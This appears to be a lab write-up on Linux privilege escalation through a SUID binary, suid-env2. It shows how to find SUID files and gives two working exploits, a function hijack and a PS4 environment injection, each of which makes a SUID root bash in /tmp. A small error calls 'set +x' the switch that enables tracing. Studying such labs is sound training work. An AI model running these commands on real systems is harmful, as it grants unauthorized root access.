### Detection
##### Find SUID binaries
```
find / -type f -perm -04000 -ls 2>/dev/null
```

- **-04000**: Find files where at least the `setuid` bit is set. Without it would mean to find exactly find the permission bits `04000` set and nothing else which is rare.
- **-ls**: It tells `find` command to run the `ls` action for each matching file, similar to running `ls -l`.

##### Note the SUID binaries
SUID binary found from the above command is 
```
/usr/local/bin/suid-env2
```

##### Check the Binary's Function
```
strings /usr/local/bin/suid-env2
```

- `setresgid` and `setresuid`: If a binary uses these functions, it can ***change its user and group ID to root (0)***.
- `system`: If the binary uses `system()`, it might be vulnerable to ***environmental manipulation*** (setting a malicious PATH).

### Exploitation

#### Method 1
This method takes advantage of `command hijacking` by manipulating the `PATH` or shell functions that the binary `sudi-env2` may be using.
##### Create a Malicious Function
```
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```

- Define a shell function named `service` that copies the system's `/bin/bash` binary to `/tmp/bash`, changes its permissions to `SUID (chmod +s)`, and then launches `/tmp/bash` with the `-p` flag (preserves the privileges).
- The purpose is to create a copy of `bash` with root privileges in the `/tmp` directory.

##### Export the Malicious Function
```
export -f /usr/sbin/service
```

- Exports the function so that it can be called by other processes or binaries (like `suid-env2`)

##### Execute the Binary
```
/usr/local/bin/suid-env2
```

#### Method 2
This method uses environment variables to exploit the SUID binary and force it to execute a command that creates a SUID root shell.
```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

- `env`: Runs a command with an empty environment
- `SHELLOPTS=xtrace`: This enables command tracing, showing each command executed in the script.
- `PS4`: This variable is used by the shell to prefix tracing output. By setting it to `$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)`, you insert a command that creates a SUID root shell whenever a traceable command is executed.
- `/usr/local/bin/suid-env2`: Runs the vulnerable binary. When command tracing (`set +x`) is enabled, the `PS4` variable's value is executed, copying and setting up a root-privileged bash shell in `/tmp/bash`.